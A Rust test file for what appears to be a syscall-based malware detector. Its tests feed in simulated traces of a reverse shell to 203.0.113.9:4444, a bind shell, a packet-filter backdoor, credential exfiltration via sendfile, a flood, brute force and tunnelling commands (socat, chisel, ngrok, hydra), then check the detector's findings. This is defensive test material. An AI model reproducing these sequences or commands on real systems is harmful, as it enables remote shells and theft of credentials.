// SPDX-License-Identifier: GPL-3.0-only
use super::support::*;

pub fn tcp_to(ip: [u8; 4], port: u16) -> Calls {
    vec![socket(1, 2, 1, 3), connect(1, 3, ip, port)]
}

#[test]
pub fn a_socket_on_a_shells_input_and_output_is_a_reverse_shell() {
    let mut calls = tcp_to([203, 0, 113, 9], 4444);
    calls.extend([
        dup2(1, 3, 0),
        dup2(1, 3, 1),
        dup2(1, 3, 2),
        exec(1, "/bin/sh", &["sh", "-i"]),
    ]);
    let out = run(calls);
    let row = rows(&out, "c2.reverse_shell");
    assert_eq!(row.len(), 1);
    assert_eq!(text(row[0], "finding.tier"), "high");
    assert!(text(row[0], "finding.summary").contains("203.0.113.9:4444"));
    assert_eq!(
        list(row[0], "finding.technique"),
        ["T1059.004", "DET0384", "T1095"]
    );
    // Without the dup2 calls there is no wiring.
    let mut plain = tcp_to([203, 0, 113, 9], 4444);
    plain.push(exec(1, "/bin/sh", &["sh"]));
    assert!(!has(&run(plain), "c2.reverse_shell"));
    // A program that is not a shell or interpreter is not a shell.
    let mut other = tcp_to([203, 0, 113, 9], 4444);
    other.extend([
        dup2(1, 3, 0),
        dup2(1, 3, 1),
        exec(1, "/usr/bin/cat", &["cat"]),
    ]);
    assert!(!has(&run(other), "c2.reverse_shell"));
}

#[test]
pub fn an_accepted_client_wired_to_a_shell_is_a_bind_shell() {
    let mut calls = vec![
        socket(1, 2, 1, 3),
        sys(1, 49, "bind", [3, 0, 16, 0, 0, 0], 0),
        sys(1, 50, "listen", [3, 1, 0, 0, 0, 0], 0),
    ];
    let accept = with_exit(
        sys(1, 43, "accept", [3, 0x1000, 0x2000, 0, 0, 0], 4),
        "arg1.address",
        &address(2, [198, 51, 100, 4], 51000),
    );
    calls.extend([
        accept,
        dup2(1, 4, 0),
        dup2(1, 4, 1),
        exec(1, "/bin/bash", &["bash"]),
    ]);
    let out = run(calls);
    assert_eq!(tier(&out, "c2.bind_shell").as_deref(), Some("high"));
    assert!(!has(&out, "c2.reverse_shell"));
}

#[test]
pub fn listening_on_every_interface_is_medium_and_loopback_or_housekeeping_is_not() {
    let listen_on = |ip: [u8; 4], port: u16| {
        let bind = with_entry(
            sys(1, 49, "bind", [3, 0x1000, 16, 0, 0, 0], 0),
            "arg1.address",
            &address(2, ip, port),
        );
        run(vec![
            socket(1, 2, 1, 3),
            bind,
            sys(1, 50, "listen", [3, 8, 0, 0, 0, 0], 0),
        ])
    };
    assert_eq!(
        tier(&listen_on([0, 0, 0, 0], 8080), "network.listen_any").as_deref(),
        Some("medium")
    );
    assert!(!has(&listen_on([127, 0, 0, 1], 8080), "network.listen_any"));
    let udp = |ip: [u8; 4], port: u16| {
        let bind = with_entry(
            sys(1, 49, "bind", [3, 0x1000, 16, 0, 0, 0], 0),
            "arg1.address",
            &address(2, ip, port),
        );
        run(vec![socket(1, 2, 2, 3), bind])
    };
    assert!(has(&udp([0, 0, 0, 0], 9999), "network.listen_any"));
    assert!(
        !has(&udp([0, 0, 0, 0], 0), "network.listen_any"),
        "an ephemeral port is not an offer"
    );
    assert!(
        !has(&udp([0, 0, 0, 0], 68), "network.listen_any"),
        "DHCP is VM housekeeping"
    );
    assert!(
        !has(&udp([0, 0, 0, 0], 5353), "network.listen_any"),
        "mDNS is VM housekeeping"
    );
}

#[test]
pub fn raw_and_packet_sockets_are_medium() {
    assert_eq!(
        tier(&run(vec![socket(1, 17, 3, 3)]), "network.raw_socket").as_deref(),
        Some("medium")
    );
    assert!(has(&run(vec![socket(1, 2, 3, 3)]), "network.raw_socket"));
    assert!(has(&run(vec![socket(1, 10, 3, 3)]), "network.raw_socket"));
    assert!(!has(&run(vec![socket(1, 2, 1, 3)]), "network.raw_socket"));
    let mut capture = vec![exec(1, "/usr/sbin/tcpdump", &["tcpdump"])];
    capture.push(socket(1, 17, 3, 3));
    assert_eq!(
        tier(&run(capture), "network.raw_socket").as_deref(),
        Some("low"),
        "tcpdump is on the allow-list"
    );
}

#[test]
pub fn a_filter_on_a_packet_socket_is_a_magic_packet_backdoor() {
    let attach = |fd: u64| sys(1, 54, "setsockopt", [fd, 1, 26, 0, 16, 0], 0);
    let out = run(vec![socket(1, 17, 3, 3), attach(3)]);
    assert_eq!(tier(&out, "c2.bpf_backdoor").as_deref(), Some("high"));
    assert_eq!(tier(&out, "bpf.socket_filter").as_deref(), Some("medium"));
    let tcp = run(vec![socket(1, 2, 1, 3), attach(3)]);
    assert!(!has(&tcp, "c2.bpf_backdoor"));
    assert!(has(&tcp, "bpf.socket_filter"));
    assert!(!has(
        &run(vec![sys(1, 54, "setsockopt", [3, 6, 26, 0, 16, 0], 0)]),
        "bpf.socket_filter"
    ));
    assert_eq!(
        list(rows(&out, "c2.bpf_backdoor")[0], "finding.technique"),
        ["T1205.002", "DET0162"]
    );
}

#[test]
pub fn tor_irc_and_proxy_tools_are_medium() {
    assert!(has(&run(tcp_to([127, 0, 0, 1], 9050)), "network.tor"));
    assert!(has(
        &run(vec![exec(1, "/usr/bin/tor", &["tor"])]),
        "network.tor"
    ));
    assert!(!has(&run(tcp_to([203, 0, 113, 9], 9050)), "network.tor"));
    assert_eq!(
        tier(&run(tcp_to([203, 0, 113, 9], 6667)), "network.irc_c2").as_deref(),
        Some("medium")
    );
    let nick = {
        let mut calls = tcp_to([203, 0, 113, 9], 8000);
        calls.push(with_entry(
            sys(1, 1, "write", [3, 0, 11, 0, 0, 0], 11),
            "arg1.data",
            b"NICK bot42\r\n",
        ));
        run(calls)
    };
    assert!(has(&nick, "network.irc_c2"));
    for argv in [
        vec!["ssh", "-N", "-R", "8080:localhost:80", "host"],
        vec!["ssh", "-D", "1080", "host"],
        vec!["socat", "TCP-LISTEN:1,fork", "TCP:1.2.3.4:5"],
        vec!["chisel", "client", "x"],
        vec!["ngrok", "tcp", "22"],
    ] {
        let path = format!("/usr/bin/{}", argv[0]);
        assert_eq!(
            tier(&run(vec![exec(1, &path, &argv)]), "network.proxy_tunnel").as_deref(),
            Some("medium"),
            "{argv:?}"
        );
    }
    assert!(!has(
        &run(vec![exec(1, "/usr/bin/ssh", &["ssh", "host"])]),
        "network.proxy_tunnel"
    ));
}

#[test]
pub fn an_elf_received_from_the_network_and_saved_is_high() {
    let out = run(vec![
        socket(1, 2, 1, 3),
        connect(1, 3, [203, 0, 113, 9], 80),
        read(1, 3, b"\x7fELF\x02\x01\x01"),
        open_write(1, "/tmp/payload", 4),
        write(1, 4, b"\x7fELF\x02\x01\x01"),
    ]);
    assert_eq!(tier(&out, "c2.elf_download").as_deref(), Some("high"));
    let page = run(vec![
        socket(1, 2, 1, 3),
        connect(1, 3, [203, 0, 113, 9], 80),
        read(1, 3, b"<html>hello</html>"),
        open_write(1, "/tmp/page.html", 4),
        write(1, 4, b"<html>hello</html>"),
    ]);
    assert!(!has(&page, "c2.elf_download"));
}

#[test]
pub fn a_file_sent_straight_to_a_socket_is_medium() {
    let out = run(vec![
        socket(1, 2, 1, 3),
        connect(1, 3, [203, 0, 113, 9], 443),
        open_read(1, "/root/.aws/credentials", 4),
        sys(1, 40, "sendfile", [3, 4, 0, 4096, 0, 0], 120),
    ]);
    let row = rows(&out, "exfil.file_to_socket");
    assert_eq!(row.len(), 1);
    assert_eq!(text(row[0], "finding.tier"), "medium");
    assert!(list(row[0], "finding.detail")
        .iter()
        .any(|line| line.contains("credential")));
    let to_file = run(vec![
        open_read(1, "/tmp/a", 4),
        open_write(1, "/tmp/b", 5),
        sys(1, 40, "sendfile", [5, 4, 0, 4096, 0, 0], 12),
    ]);
    assert!(!has(&to_file, "exfil.file_to_socket"));
}

#[test]
pub fn ten_megabytes_or_ten_times_more_out_than_in_is_a_large_upload() {
    let mut calls = tcp_to([203, 0, 113, 9], 443);
    for _ in 0..11 {
        calls.push(sys(1, 1, "write", [3, 0, 1_048_576, 0, 0, 0], 1_048_576));
    }
    assert_eq!(
        tier(&run(calls), "exfil.large_upload").as_deref(),
        Some("medium")
    );
    let mut skewed = tcp_to([203, 0, 113, 9], 443);
    skewed.push(sys(1, 0, "read", [3, 0, 100, 0, 0, 0], 100));
    for _ in 0..2 {
        skewed.push(sys(1, 1, "write", [3, 0, 1_048_576, 0, 0, 0], 1_048_576));
    }
    assert!(has(&run(skewed), "exfil.large_upload"));
    let mut local = tcp_to([10, 0, 2, 2], 443);
    for _ in 0..11 {
        local.push(sys(1, 1, "write", [3, 0, 1_048_576, 0, 0, 0], 1_048_576));
    }
    assert!(
        !has(&run(local), "exfil.large_upload"),
        "a private destination is not an upload"
    );
    let mut small = tcp_to([203, 0, 113, 9], 443);
    small.push(sys(1, 1, "write", [3, 0, 2048, 0, 0, 0], 2048));
    assert!(!has(&run(small), "exfil.large_upload"));
}

#[test]
pub fn a_thousand_packets_a_second_to_one_target_is_a_flood() {
    let mut calls = vec![socket(1, 2, 2, 3), connect(1, 3, [198, 51, 100, 9], 80)];
    for n in 0..1200u64 {
        calls.push(at(
            sys(1, 44, "sendto", [3, 0, 64, 0, 0, 0], 64),
            n * 500_000,
        ));
    }
    assert_eq!(
        tier(&run(calls), "impact.ddos_flood").as_deref(),
        Some("high")
    );
    let mut slow = vec![socket(1, 2, 2, 3), connect(1, 3, [198, 51, 100, 9], 80)];
    for n in 0..1200u64 {
        slow.push(at(
            sys(1, 44, "sendto", [3, 0, 64, 0, 0, 0], 64),
            n * 50 * MS,
        ));
    }
    assert!(!has(&run(slow), "impact.ddos_flood"));
}

#[test]
pub fn many_short_logins_to_ssh_and_telnet_ports_are_brute_force_even_when_refused() {
    let mut calls = vec![socket(1, 2, 1, 3)];
    for n in 0..12u8 {
        let mut attempt = connect(
            1,
            3,
            [198, 51, 100, n + 1],
            if n % 2 == 0 { 22 } else { 23 },
        );
        attempt.exit.as_mut().unwrap().result = Some(-111);
        calls.push(attempt);
    }
    let out = run(calls);
    assert_eq!(tier(&out, "lateral.bruteforce").as_deref(), Some("high"));
    assert!(has(
        &run(vec![exec(
            1,
            "/usr/bin/hydra",
            &["hydra", "-l", "root", "ssh://10.0.0.5"]
        )]),
        "lateral.bruteforce"
    ));
    let few: Calls = std::iter::once(socket(1, 2, 1, 3))
        .chain((1..4u8).map(|n| connect(1, 3, [198, 51, 100, n], 22)))
        .collect();
    assert!(!has(&run(few), "lateral.bruteforce"));
}

#[test]
pub fn commonly_attacked_service_ports_on_several_hosts_are_medium() {
    let mut calls = vec![socket(1, 2, 1, 3)];
    for host in 1..=4u8 {
        calls.push(connect(1, 3, [198, 51, 100, host], 6379));
    }
    assert_eq!(
        tier(&run(calls), "lateral.service_exploit").as_deref(),
        Some("medium")
    );
    let one: Calls = vec![
        socket(1, 2, 1, 3),
        connect(1, 3, [198, 51, 100, 1], 6379),
        connect(1, 3, [198, 51, 100, 1], 6379),
    ];
    assert!(!has(&run(one), "lateral.service_exploit"));
}

#[test]
pub fn files_pushed_to_another_host_are_medium() {
    for argv in [
        vec!["scp", "/tmp/x", "root@10.0.0.7:/tmp/"],
        vec!["rsync", "-a", "/data/", "host:/backup"],
        vec!["curl", "-T", "/tmp/x", "http://203.0.113.9/up"],
        vec!["ssh", "host", "cat > /tmp/x"],
    ] {
        let path = format!("/usr/bin/{}", argv[0]);
        assert_eq!(
            tier(&run(vec![exec(1, &path, &argv)]), "lateral.tool_transfer").as_deref(),
            Some("medium"),
            "{argv:?}"
        );
    }
    assert!(
        !has(
            &run(vec![exec(
                1,
                "/usr/bin/scp",
                &["scp", "host:/etc/x", "/tmp/"]
            )]),
            "lateral.tool_transfer"
        ),
        "pulling a file is not pushing one"
    );
    assert!(!has(
        &run(vec![exec(
            1,
            "/usr/bin/curl",
            &["curl", "http://203.0.113.9/x"]
        )]),
        "lateral.tool_transfer"
    ));
}

fn connect_result(pid: u32, ip: [u8; 4], port: u16, result: i64) -> InvocationSummary {
    with_entry(
        sys(pid, 42, "connect", [3, 0x1000, 16, 0, 0, 0], result),
        "arg1.address",
        &address(2, ip, port),
    )
}

fn tries(count: usize, ip: [u8; 4], port: u16, result: i64) -> Calls {
    let mut calls = vec![socket(1, 2, 1, 3)];
    calls.extend((0..count).map(|n| {
        at(
            connect_result(1, ip, port, result),
            (n as u64 + 1) * 3_000_000_000,
        )
    }));
    calls
}

#[test]
pub fn ten_failed_connects_to_one_public_address_are_a_retry_loop() {
    let out = run(tries(34, [203, 0, 113, 9], 4444, -111));
    let row = rows(&out, "network.dead_c2");
    assert_eq!(row.len(), 1);
    assert_eq!(
        text(row[0], "finding.tier"),
        "medium",
        "a failed call keeps it"
    );
    assert_eq!(
        text(row[0], "finding.title"),
        "Retries a dead command server"
    );
    assert!(text(row[0], "finding.summary").contains("203.0.113.9:4444"));
    assert!(
        text(row[0], "finding.summary").contains("at least 10 times"),
        "{}",
        text(row[0], "finding.summary")
    );
    // Counted from the tenth failure on, all failed.
    assert_eq!(count(row[0]), 25);
    assert!(list(row[0], "finding.detail")
        .iter()
        .any(|line| line.contains("ECONNREFUSED")));
}

#[test]
pub fn a_few_failed_connects_are_ordinary_retry_noise() {
    assert!(!has(
        &run(tries(9, [203, 0, 113, 9], 4444, -111)),
        "network.dead_c2"
    ));
    // Unreachable network and timeouts count like a refusal.
    for result in [-101, -110, -113] {
        assert!(has(
            &run(tries(12, [203, 0, 113, 9], 4444, result)),
            "network.dead_c2"
        ));
    }
    // A pending non-blocking connect is not a failure.
    assert!(!has(
        &run(tries(40, [203, 0, 113, 9], 4444, -115)),
        "network.dead_c2"
    ));
}

#[test]
pub fn one_success_keeps_an_address_from_being_dead() {
    let mut calls = vec![
        socket(1, 2, 1, 3),
        connect_result(1, [203, 0, 113, 9], 443, 0),
    ];
    calls.extend(tries(30, [203, 0, 113, 9], 443, -111).into_iter().skip(1));
    assert!(!has(&run(calls), "network.dead_c2"));
    // The count is per address and port: ten tries spread over ten ports are
    // not one dead server.
    let mut spread = vec![socket(1, 2, 1, 3)];
    spread.extend((0..30).map(|at| connect_result(1, [203, 0, 113, 9], 4000 + at % 10, -111)));
    assert!(!has(&run(spread), "network.dead_c2"));
}

#[test]
pub fn name_servers_housekeeping_local_addresses_and_the_base_do_not_count() {
    for (ip, port) in [
        ([8, 8, 8, 8], 53),
        ([203, 0, 113, 9], 123),
        ([203, 0, 113, 9], 67),
        ([10, 0, 2, 3], 8080),
        ([192, 168, 1, 1], 8080),
        ([127, 0, 0, 1], 8080),
    ] {
        assert!(
            !has(&run(tries(40, ip, port, -111)), "network.dead_c2"),
            "{ip:?}:{port}"
        );
    }
    // A base image program (the time client) retrying is the base's noise.
    let mut calls = vec![exec(1, "/usr/sbin/chronyd", &["chronyd"])];
    calls.extend(tries(40, [203, 0, 113, 9], 4444, -111));
    assert!(!has(&run(calls), "network.dead_c2"));
}

#[test]
pub fn a_retry_loop_across_forked_processes_is_still_one_dead_server() {
    let mut calls = vec![socket(1, 2, 1, 3)];
    for at in 0..12u32 {
        calls.push(connect_result(1 + at % 3, [203, 0, 113, 9], 8080, -101));
    }
    let out = run(calls);
    assert!(has(&out, "network.dead_c2"));
}
